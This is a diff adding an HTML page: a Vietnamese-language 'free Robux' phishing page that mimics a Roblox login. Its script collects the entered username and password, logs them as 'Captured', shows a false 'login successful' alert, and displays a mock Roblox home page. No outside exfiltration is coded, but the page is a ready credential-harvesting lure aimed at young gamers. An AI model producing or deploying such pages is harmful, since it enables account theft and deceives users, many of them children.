@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; margin: 0; }
+        header { padding: 10px; border-bottom: 1px solid #333; }
+        .nav-home { font-size: 0.8rem; }
+        #app { padding: 20px; text-align: center; }
+        input { display: block; width: 80%; margin: 10px auto; padding: 10px; background: #1E1E1E; border: 1px solid #333; color: white; }
+        button { padding: 10px 20px; background: #0060df; border: none; color: white; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <header><span class="nav-home">Home</span></header>
+    <div id="app">
+        <h1>Tặng Robux</h1>
+        <input type="text" id="user" placeholder="Tên người dùng/Email">
+        <input type="password" id="pass" placeholder="Mật khẩu">
+        <button onclick="login()">Đăng nhập</button>
+    </div>
+
+    <script>
+        function login() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            // Data captured
+            console.log("Captured:", u, p); 
+            alert("Đăng nhập thành công");
+            
+            // Redirecting to mock Roblox interface
+            document.getElementById('app').innerHTML = "<h1>Trang chủ Roblox</h1><p>Dữ liệu đã truyền: " + u + " / " + p + "</p>";
+        }
+    </script>
+</body>
+  </html>
+  
